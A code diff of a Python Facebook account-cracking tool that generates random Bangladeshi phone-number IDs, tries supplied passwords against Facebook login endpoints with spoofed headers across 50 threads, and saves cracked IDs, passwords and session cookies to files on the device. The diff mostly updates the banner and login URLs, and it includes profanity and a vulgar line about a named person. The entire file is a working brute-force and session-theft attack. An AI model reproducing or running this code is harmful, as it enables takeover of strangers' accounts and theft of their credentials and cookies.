@@ -94,31 +94,18 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo = ("""
-\033[1;32m   .-.                           ___         
- \033[1;32m  /    \                        (   )        
- \033[1;37m | .`. ;   ___  ___    .--.     | |   ___   
-  \033[1;37m| |(___) (   )(   )  /    \    | |  (   )  
- \033[1;37m | |_      | |  | |  |  .-. ;   | |  ' /    
-\033[1;32m (   __)    | |  | |  |  |(___)  | |,' /     
-\033[1;32m  | |       | |  | |  |  |       | .  '.     
-  \033[1;37m| |       | |  | |  |  | ___   | | `. \    
- \033[1;37m | |       | |  ; '  |  '(   )  | |   \ \   
- \033[1;32m | |       ' `-'  /  '  `-' |   | |    \ .  
- \033[1;32m(___)       '.__.'    `.__,'   (___ ) (___) 
-                                            
-                                            
-                       
-                       
-   
-\033[1;37m------------------------------------------------
-\033[1;32m Owner   :  Arafat hosan    fuck to Mia Khalifa 
-\033[1;32m Facebook:  Arafat hosan  fuck to Mia Khalifa 
-\033[1;32m Github  :  Arafat hosan   fuck  to Mia Khalifa  
-\033[1;32m Version : 0.1
-\033[1;37m------------------------------------------------ """)                                         
-                                            
+\033[1;32m ▄▄▄· ▄▄▄   ▄▄▄· ·▄▄▄ ▄▄▄· ▄▄▄▄▄
+\033[1;32m▐█ ▀█ ▀▄ █·▐█ ▀█ ▐▄▄·▐█ ▀█ •██  
+\033[1;32m▄█▀▀█ ▐▀▀▄ ▄█▀▀█ ██▪ ▄█▀▀█  ▐█.▪
+\033[1;32m▐█ ▪▐▌▐█•█▌▐█ ▪▐▌██▌.▐█ ▪▐▌ ▐█▌·
+ \033[1;32m▀  ▀ .▀  ▀ ▀  ▀ ▀▀▀  ▀  ▀  ▀▀▀ \033[1;97mV\033[1;32m/\033[1;97m0.1
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m
+[\033[1;32m~\033[1;97m] DEVELOPER  \033[1;32m●\033[1;97m ARAFAT HASAN XD
+[\033[1;32m~\033[1;97m] FACEBOOK   \033[1;32m●\033[1;97m ARAFAT HASAN       
+[\033[1;32m~\033[1;97m] TOOL       \033[1;32m●\033[1;97m    (\033[1;32mPAID\033[1;97m)
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m""")
 def linex():
-	print('\\033[1;32m  __________________________________________')
+	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m')
 loop = 0
 oks = []
 cps = []
@@ -215,16 +202,16 @@ def xxr():
     os.geteuid
     os.system("clear")
     print(logo)
-    print(f' \033[1;37m [\033[1;32m•\033[1;32m]\033[1;32m Example : {xr}019,017,018,92302,92301,91778{x}')
-    print(" \033[1;37m________________________________________________")
+    print(f'[\033[1;32m~\033[1;97m]\033[1;32m Example : {xr}019,017,018,92302,92301,91778{x}')
+    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
     rk1 = '0171'
     rk2 = '0172'
     rk3 = '0175'
     code = random.choice([rk1,rk2,rk3])                      
-    pww = input(f' \033[1;37m [\033[1;97m•\033[1;37m ]\033[1;92m Choose : ')
+    pww = input(f'[\033[1;32m~\033[1;97m]\033[1;92m Choose : ')
     os.system('clear')
     print(logo)
-    limit = int(input(f' \033[1;37m [\033[1;97m•\033[1;37m ]\033[1;92m EXAMPLE : 2000, 3000, 5000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;37m [\033[1;97m•\033[1;37m ]\033[1;92m PUT CLONING LIMIT: '))
+    limit = int(input(f'[\033[1;32m~\033[1;97m]\033[1;92m EXAMPLE : 2000, 3000, 5000 \n \033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n \033[1;37m[\033[1;32m~\033[1;97m]\033[1;92mPUT CLONING LIMIT: '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
@@ -234,18 +221,18 @@ def xxr():
     HamiiID = []
     print("")
     for bilal in range(passx):
-        pww = input(f"\033[1;37m [\033[1;97m•\033[1;37m ]\033[1;92m Enter Password {bilal+1} : ")
+        pww = input(f"[\033[1;32m~\033[1;97m]\033[1;92m Enter Password {bilal+1} : ")
         HamiiID.append(pww)
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
-        print(f' \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;32mTOTAL IDS: {xr}'+tl)
-        print(f'{x} \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;32mTHE PROCESS HAS BEEN STARTED')
-        print(f' \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;32mWORK CUNTRY \033[1;32m: \033[1;32mBANGLADESH')
-        print(f' \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;32mTOOL OWNER \033[1;32m: \033[1;32m FUCK')
-        print(f' \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;32mUSE NETWORK  \033[1;32m:  \033[1;32m2G, 3G, 4G, 5G ')
-        print(f' \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;37m  USE AEROPLANE MOOD IN EVERY 5 MIN ')
-        print(f" \033[1;32m_______________________________________________________")
+        print(f'[\033[1;32m~\033[1;97m]\033[1;97mTOTAL IDS: {xr}'+tl)
+        print(f'[\033[1;32m~\033[1;97m]\033[1;97mTHE PROCESS HAS BEEN STARTED')
+        print(f'[\033[1;32m~\033[1;97m]\033[1;97mWORK CUNTRY \033[1;32m: \033[1;32mBANGLADESH')
+        print(f'[\033[1;32m~\033[1;97m]\033[1;97mTOOL OWNER \033[1;32m: \033[1;32m FUCK')
+#        print(f'[\033[1;32m~\033[1;97m]\033[1;32mUSE NETWORK  \033[1;32m:  \033[1;32m2G, 3G, 4G, 5G ')
+#        print(f' \033[1;37m[\033[1;97m•\033[1;37m ]\033[1;37m  USE AEROPLANE MOOD IN EVERY 5 MIN ')
+        print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
         for love in user:
             pwx = [love[1:]]
             uid = code+love
@@ -253,7 +240,7 @@ def xxr():
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} \033[1;32m________________________________________________")
+    print(f"\n{x}\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
@@ -264,7 +251,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -275,49 +262,47 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'dpr': '2.625',
-    'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=Afeqo7BoucH7Ht198Y6vGKzgAke4VepyyOXngfHCuOxOUQUu993p9I5PUqRLNlnPvMdujA5V6qi82bhsTv-FSAwFHKN84oXYuX1NWV8ZRus45Q&smuh=44566&lh=Ac9xGXWI9WVARaT6yBM&ref=wizard&ref_component=mbasic_footer&_rdr',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    'viewport-width': '980',
-}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'p.facebook.com',
+            'method': 'POST',
+            'path': '/login/?li=WZf4Y-5ptvqkGhzX8fnGGoQo&e=1348029&shbl=1&refsrc=deprecated&_rdr',
+            'scheme': 'https',    
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'origin': 'https://p.facebook.com',
+            'referer': 'https://p.facebook.com/',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://www.facebook.com/login/?li=WZf4Y-5ptvqkGhzX8fnGGoQo&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+            lo = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m [FUCK-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m [ARAFAT-OK] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/FUCK-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/ARAFAT-COOKIE.txt','a').write(cid+'|'+ps+ '|' +coki+'\n')
+                open('/sdcard/ARAFAT-OK.txt', 'a').write( cid+'|'+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;31m [FUCK-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('\r\r\33[1;31m [FUCK-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/FUCK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s {x}[{xr}FUCK-CYBER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}FUCK-CYBER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
